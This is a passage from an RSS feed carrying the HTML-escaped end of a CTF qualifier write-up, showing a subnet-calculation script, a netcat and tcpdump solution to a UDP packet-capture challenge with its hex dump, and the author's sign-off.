&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;IP: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;ip&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;/&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;mask&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Network address: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;network_address&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Broadcast address: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;broadcast_address&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;            sum_of_fourth_octets &lt;span style=&#34;color:#f92672&#34;&gt;+=&lt;/span&gt; int(network_address&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;split(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;.&amp;#39;&lt;/span&gt;)[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        print(&lt;span style=&#34;color:#e6db74&#34;&gt;f&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;Sum of fourth octets: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;{&lt;/span&gt;sum_of_fourth_octets&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; __name__ &lt;span style=&#34;color:#f92672&#34;&gt;==&lt;/span&gt; &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;__main__&amp;#39;&lt;/span&gt;:
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    main()
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Which gave us the answer &lt;code&gt;25604&lt;/code&gt;. I am very surprised this worked, and saved me from doing some scripting. So I do apologise for not doing this properly and explaining how to calculate it, hopefully that code is enough :)&lt;/p&gt;
&lt;h2 id=&#34;picture-125&#34;&gt;Picture (125)&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;There is a service running on woxuazsgxd.qualifier.hackabit.com:54321&lt;/p&gt;
&lt;/blockquote&gt;
&lt;blockquote&gt;
&lt;p&gt;Connect to it and try to follow the mail&amp;hellip;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;Connecting to it with netcat gives us a message along the lines of the flag was sent to you to a random UDP port 5000-5500&lt;/p&gt;
&lt;p&gt;Definetly one of the harder ones by far. My initial thought was to use Wireshark to capture packages, and filter by protocol UDP or port number, but neither of that worked for some reason. Trying another packet capture method with &lt;code&gt;sudo tcpdump -i ens3 udp -vvv -X&lt;/code&gt;, we get the flag &lt;code&gt;flag{the_mailman_is_confused_but_you&#39;re_not}&lt;/code&gt;&lt;/p&gt;
&lt;pre tabindex=&#34;0&#34;&gt;&lt;code&gt;14:49:48.524413 IP (tos 0x40, ttl 55, id 741, offset 0, flags [DF], proto UDP (17), length 72)
    201.15.132.34.bc.googleusercontent.com.1235 &amp;gt; vps-7443235f.vps.ovh.ca.5236: [udp sum ok] UDP, length 44
        0x0000:  4540 0048 02e5 4000 3711 fb0b 2284 0fc9  E@.H..@.7...&amp;#34;...
        0x0010:  8b63 87c4 04d3 1474 0034 d36f 666c 6167  .c.....t.4.oflag
        0x0020:  7b74 6865 5f6d 6169 6c6d 616e 5f69 735f  {the_mailman_is_
        0x0030:  636f 6e66 7573 6564 5f62 7574 5f79 6f75  confused_but_you
        0x0040:  2772 655f 6e6f 747d                      &amp;#39;re_not}
&lt;/code&gt;&lt;/pre&gt;&lt;p&gt;Still not sure why wireshark didn&amp;rsquo;t work, if anyone has an explanation please let me know!&lt;/p&gt;
&lt;h1 id=&#34;6-osint&#34;&gt;6. OSINT&lt;/h1&gt;
&lt;p&gt;Okay, I only solved 2 out of 8 OSINT challenges, so I won&amp;rsquo;t be doing any OSINT writeups. I really couldn&amp;rsquo;t be bothered with OSINT after all the other chals, as I don&amp;rsquo;t really enjoy OSINT particularly.&lt;/p&gt;
&lt;p&gt;So that&amp;rsquo;s it for the writeups! Doubt anyone read almost 1000 lines of Markdown, but thanks for reading!&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;teddy / TheSavageTeddy&lt;/li&gt;
&lt;/ul&gt;
</content>
    </item>
    
  </channel>
</rss>
